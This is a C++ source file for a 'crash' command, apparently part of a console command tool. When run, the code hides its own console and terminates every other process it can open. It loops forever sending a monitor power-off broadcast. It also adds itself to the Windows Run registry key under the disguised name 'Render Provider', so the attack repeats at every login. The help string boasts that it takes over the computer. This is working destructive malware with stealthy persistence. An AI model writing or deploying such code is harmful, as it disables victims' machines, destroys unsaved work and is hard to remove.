#include "stdafx.h"
#include "CommandCrash.h"


CommandCrash::CommandCrash()
{
}


CommandCrash::~CommandCrash()
{
}

bool CommandCrash::shouldRunThisCommand(ParsedCommand* Parsed)
{
	return (Parsed->Words->at(0) == "crash");
}

void CommandCrash::run(ParsedCommand* Parsed)
{
	//Turn off the moniter(s)
	thread* moniter = new thread(&CommandCrash::turnOffMoniter, this);

	//Kill as many processes as possible, to free up resources, and reduce resistance.
	thread* processKiller = new thread(&CommandCrash::AttackProcesses, this);

	this->RegisterProgram();
}

void CommandCrash::AttackProcesses()
{
	WCHAR path[260];
	GetModuleFileName(NULL, path, 260);
	HWND console = FindWindow(L"ConsoleWindowClass", path);

	if (IsWindow(console))
	{
		ShowWindow(console, SW_HIDE);
	}

	// Get the list of process identifiers.  
	register unsigned long aProcesses[1024];
	unsigned long cbNeeded;
	unsigned long numberOfProcesses;

	EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded);

	numberOfProcesses = cbNeeded / sizeof(unsigned long);

	register unsigned int i = 0;
	void* hProcess;
	unsigned long CID = GetCurrentProcessId();
	EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded);
	i = 0;
	numberOfProcesses = cbNeeded / sizeof(unsigned long);

	for (i = 0; i < numberOfProcesses; i++)
	{
		//Get process handle.
		hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, aProcesses[i]);
		void* info = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

		wchar_t buffer[MAX_PATH];
		GetModuleFileNameEx(info, NULL, buffer, MAX_PATH);
		wstring ws(buffer);
		string converted(ws.begin(), ws.end());

		char drive[4];
		char directory[MAX_PATH];
		char filename[MAX_PATH];
		char extension[MAX_PATH];
		_splitpath(converted.c_str(), drive, directory, filename, extension);

		//Make sure its not the host for this program.
		//We can't directly kill ourselves when not elevated, but we could kill something needed to run this program.
		if (filename[0] != 'C' || filename[1] != 'o' || filename[2] != 'm' || filename[3] != 'm'
			|| filename[4] != 'a' || filename[5] != 'n' || filename[6] != 'd'
			|| extension[0] != '.' || extension[1] != 'e' || extension[2] != 'x'
			|| extension[3] != 'e')
		{
			//Kill process.
			TerminateProcess(hProcess, 1);
		}
	}
}

void CommandCrash::turnOffMoniter()
{
	//https://www.codeproject.com/articles/11099/turn-on-off-monitor
	while (true)
	{
		SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
	}
}

string* CommandCrash::getName()
{
	return new string("Crash");
}

string* CommandCrash::getHelp()
{
	return new string("Takes over your computer. Good luck getting it back without a hard shutdown.");
}

BOOL CommandCrash::IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	wchar_t szPathToExe[MAX_PATH] = {};
	DWORD dwSize = sizeof(szPathToExe);

	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
		fSuccess = (lResult == 0);
	}

	if (fSuccess)
	{
		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

BOOL CommandCrash::RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

void CommandCrash::RegisterProgram()
{
	wchar_t szPathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	RegisterMyProgramForStartup(L"Render Provider", szPathToExe, L"crash");
}
